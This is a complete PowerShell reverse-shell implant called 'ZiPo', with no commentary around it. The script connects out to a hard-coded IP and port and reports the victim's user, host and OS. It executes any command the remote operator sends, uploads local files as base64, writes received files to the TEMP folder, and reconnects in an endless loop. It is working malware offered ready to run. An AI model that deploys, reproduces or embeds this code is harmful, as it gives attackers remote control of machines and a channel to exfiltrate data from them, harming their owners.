function Connect-ZiPo {
    $srv = "192.168.50.228"
    $port = 6666
    $Blocked = @("exit", "shutdown", "logoff", "Restart-Computer", "Remove-Item", "Stop-Computer")

    function Upload-File($path) {
        if (Test-Path $path) {
            $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
            return "[UPLOAD]::$(Split-Path $path -Leaf)::`n$b64"
        } else {
            return "[ERROR]::File not found: $path"
        }
    }

    function Download-File($filename, $b64) {
        $out = "$env:TEMP\$filename"
        try {
            [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64))
            return "[DOWNLOADED] $out"
        } catch {
            return "[ERROR]::Failed to write file: $_"
        }
    }

    while ($true) {
        try {
            $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
            $stream = $tcp.GetStream()
            [byte[]]$buffer = 0..65535 | % { 0 }

            # Баннер
            $esc = [char]27
            $banner = @"
${esc}[31m
    ________  .__              __________                .___           
    \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
     |    |  \|  |/    <   |  |  |     ___/\_  __ \/  _ \|  |/ ___\/ __ \\
     |    `   \  |   |  \___  |  |    |     |  | \(  <_> )  \  \__\  ___/
    /_______  /__|___|  / ____|  |____|     |__|   \____/|__|\___  >___  >
            \/        \/\/                                      \/    \/ 
${esc}[32m
[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
OS: $([System.Environment]::OSVersion.VersionString)
Architecture: $env:PROCESSOR_ARCHITECTURE
---------------------------------------------------
${esc}[0m
"@
            $bbytes = [Text.Encoding]::ASCII.GetBytes($banner)
            $stream.Write($bbytes, 0, $bbytes.Length)
            $stream.Flush()

            while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                $cmd = ([Text.Encoding]::ASCII).GetString($buffer, 0, $i).Trim()

                if ($Blocked | Where-Object { $cmd -like "*$_*" }) {
                    $response = "[BLOCKED] Forbidden command"
                }
                elseif ($cmd.StartsWith("!upload")) {
                    $path = $cmd.Substring(7).Trim()
                    $response = Upload-File $path
                }
                elseif ($cmd.StartsWith("!download")) {
                    $parts = $cmd.Split("::")
                    if ($parts.Length -eq 3) {
                        $response = Download-File $parts[1].Trim() $parts[2].Trim()
                    } else {
                        $response = "[ERROR] Invalid download format"
                    }
                }
                else {
                    try {
                        $null = $Error.Clear()
                        $sb = [ScriptBlock]::Create($cmd)
                        $output = & $sb 2>&1 | Out-String
                        if ($LASTEXITCODE -ne $null) {
                            $output += "`n[exit code: $LASTEXITCODE]"
                        }
                        $response = $output
                    }
                    catch {
                        $response = "[ERROR] $_"
                    }
                }

                $response += "`nPS " + (Get-Location) + "> "
                $outBytes = [Text.Encoding]::ASCII.GetBytes($response)
                $stream.Write($outBytes, 0, $outBytes.Length)
                $stream.Flush()
            }

            $stream.Close()
            $tcp.Close()
        }
        catch {
            Start-Sleep -Seconds 5
        }
    }
}

Connect-ZiPo
